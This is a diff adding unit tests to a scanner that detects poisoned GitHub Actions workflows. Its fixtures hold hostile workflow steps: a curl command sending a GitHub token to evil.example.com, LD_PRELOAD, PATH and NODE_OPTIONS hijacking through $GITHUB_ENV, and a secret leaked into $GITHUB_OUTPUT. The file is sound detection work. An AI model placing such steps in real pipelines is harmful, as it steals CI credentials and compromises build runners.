@@ -1954,6 +1954,132 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
         sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
         self.assertIn("base64_payload", sig_types)
 
+    # ── RTA-05: curl auth-header exfiltration ────────────────────────────────
+
+    def test_curl_auth_header_with_secret_detected(self):
+        """RTA-05 fix — curl -H 'Authorization: Bearer ${{ secrets.X }}' caught."""
+        content = (
+            "on: schedule:\n  - cron: '0 2 * * *'\njobs:\n  sync:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: |\n"
+            "          curl -X POST \\\n"
+            "            -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" \\\n"
+            "            https://evil.example.com/collect\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/sync.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("credential_harvest", sig_types)
+
+    def test_curl_header_flag_is_critical_severity(self):
+        """RTA-05 fix — curl auth-header exfil is CRITICAL (same as credential_harvest)."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  run:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: curl --header \"Authorization: ${{ secrets.TOKEN }}\" https://x.com\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/exfil.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["flagged_workflows"][0]["severity"], "CRITICAL")
+
+    def test_curl_without_secret_in_header_not_flagged(self):
+        """RTA-05 — curl with static auth header (no secret expression) is safe."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  run:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: curl -H \"Content-Type: application/json\" https://api.example.com\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/safe.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
+    # ── RTA-07: GITHUB_ENV injection ─────────────────────────────────────────
+
+    def test_github_env_ld_preload_injection_detected(self):
+        """RTA-07 fix — LD_PRELOAD written to $GITHUB_ENV is flagged."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  setup:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: |\n"
+            "          echo \"LD_PRELOAD=/opt/attacker/lib/hook.so\" >> $GITHUB_ENV\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/setup.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("github_env_injection", sig_types)
+
+    def test_github_env_path_injection_detected(self):
+        """RTA-07 fix — PATH poisoning via $GITHUB_ENV is flagged."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  setup:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: echo \"PATH=/attacker/bin:$PATH\" >> $GITHUB_ENV\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/setup2.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("github_env_injection", sig_types)
+
+    def test_github_env_node_options_injection_detected(self):
+        """RTA-07 fix — NODE_OPTIONS=--require via $GITHUB_ENV is flagged."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  setup:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: echo \"NODE_OPTIONS=--require /attacker/inject.js\" >> $GITHUB_ENV\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/setup3.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("github_env_injection", sig_types)
+
+    def test_github_env_innocent_var_not_flagged(self):
+        """RTA-07 — writing a normal env var to $GITHUB_ENV is not flagged."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  setup:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: echo \"APP_VERSION=1.2.3\" >> $GITHUB_ENV\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/normal.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
+    # ── RTA-02: GITHUB_OUTPUT secret exfiltration ────────────────────────────
+
+    def test_github_output_secret_exfil_detected(self):
+        """RTA-02 fix — secret written to $GITHUB_OUTPUT is flagged as credential_harvest."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  run:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: echo \"token=${{ secrets.GITHUB_TOKEN }}\" >> $GITHUB_OUTPUT\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/exfil2.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 1)
+        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
+        self.assertIn("credential_harvest", sig_types)
+
+    def test_github_output_without_secret_not_flagged(self):
+        """RTA-02 — writing a non-secret value to $GITHUB_OUTPUT is safe."""
+        content = (
+            "on: workflow_dispatch\njobs:\n  run:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: echo \"version=1.2.3\" >> $GITHUB_OUTPUT\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/safe2.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["actions_poisoning"]["total"], 0)
+
 
     def test_typosquatted_oidc_action_detected_as_critical(self):
         """
